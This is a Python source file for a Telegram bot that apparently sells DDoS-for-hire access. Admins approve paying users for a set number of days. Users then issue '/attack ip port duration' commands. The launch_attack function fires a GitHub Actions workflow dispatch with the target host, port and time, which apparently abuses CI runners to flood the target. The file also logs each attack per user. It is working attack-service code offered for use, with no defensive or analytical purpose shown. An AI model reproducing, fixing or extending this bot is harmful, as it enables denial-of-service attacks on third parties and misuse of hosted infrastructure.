import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# Environment Variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# --- Database Class (Exactly Your Original) ---
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
            self.attacks.create_index([("timestamp", DESCENDING)])
            logger.info("Database Indexes Initialized")
        except Exception as e:
            logger.error(f"Index Error: {e}")
        
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing_user = self.get_user(user_id)
        if existing_user: return existing_user
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        self.users.insert_one(user_data)
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0

    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "approved_at": None, "expires_at": None}}
        )
        return result.modified_count > 0

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip, "port": port, "duration": duration,
            "status": status, "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        self.attacks.insert_one(attack_data)
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# Decorator
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin command only.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# --- FIXED API FUNCTION (Only Part Modified) ---
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        # GitHub payload format
        payload = {
            "ref": "main",
            "inputs": {
                "host": str(ip),
                "port": str(port),
                "time": str(duration)
            }
        }
        
        # GitHub specific headers
        headers = {
            "Authorization": f"token {API_KEY}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json"
        }

        response = requests.post(
            API_URL, 
            json=payload,
            headers=headers,
            timeout=15
        )
        
        if response.status_code == 204:
            return {"success": True}
        else:
            return {"success": False, "error": f"Error {response.status_code}: {response.text}"}
            
    except Exception as e:
        logger.error(f"Attack launch error: {e}")
        return {"error": str(e), "success": False}

# --- ALL YOUR ORIGINAL COMMANDS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.create_user(user.id, user.username)
    await update.message.reply_text(f"🚀 Welcome {user.first_name}!\nUse /help to see all commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🤖 **Bot Commands**\n\n"
        "📱 **User Commands:**\n"
        "🔹 /start - Start the bot\n"
        "🔹 /help - Show this help menu\n"
        "🔹 /attack ip port duration - Launch an attack\n"
        "🔹 /myattacks - Check your active attacks\n"
        "🔹 /myinfo - View your account info\n"
        "🔹 /mystats - View your attack statistics\n"
        "🔹 /blockedports - Show blocked ports\n\n"
        "👑 **Admin Commands:**\n"
        "🔹 /approve userid days - Approve a user\n"
        "🔹 /disapprove userid - Disapprove a user\n"
        "🔹 /users - List all users\n"
        "🔹 /status - Check API health\n"
        "🔹 /running - Check running attacks\n"
        "🔹 /stats - View bot statistics\n"
        "🔹 /blockedports - Show blocked ports (admin)"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)

    if not user or not user.get("approved") or (user.get("expires_at") and make_aware(user["expires_at"]) < get_current_time()):
        await update.message.reply_text("❌ Not approved or plan expired.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])

    if port in BLOCKED_PORTS:
        await update.message.reply_text(f"❌ Port {port} is blocked.")
        return

    msg = await update.message.reply_text("🚀 Launching Attack...")
    result = launch_attack(ip, port, duration)

    if result.get("success"):
        db.log_attack(user_id, ip, port, duration, "success")
        await msg.edit_text(f"✅ Attack Sent Successfully!\n🎯 Target: {ip}:{port}\n⏱️ Time: {duration}s")
    else:
        db.log_attack(user_id, ip, port, duration, "failed", result.get("error"))
        await msg.edit_text(f"❌ Attack Failed!\nError: {result.get('error')}")

@admin_required
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: return
    uid, days = int(context.args[0]), int(context.args[1])
    if db.approve_user(uid, days):
        await update.message.reply_text(f"✅ Approved {uid} for {days} days.")

@admin_required
async def disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1: return
    uid = int(context.args[0])
    if db.disapprove_user(uid):
        await update.message.reply_text(f"✅ Disapproved {uid}.")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if user:
        status = "Approved ✅" if user['approved'] else "Pending ❌"
        exp = user['expires_at'].strftime('%Y-%m-%d %H:%M') if user['expires_at'] else "N/A"
        await update.message.reply_text(f"👤 **Info:**\n🆔 ID: `{user['user_id']}`\n📊 Status: {status}\n📅 Expiry: `{exp}`", parse_mode="Markdown")

async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🚫 **Blocked Ports:**\n`{', '.join(map(str, BLOCKED_PORTS))}`", parse_mode="Markdown")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("disapprove", disapprove))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
    
    print("🤖 Original Bot is running with Fixes...")
    app.run_polling()

if __name__ == '__main__':
    main()
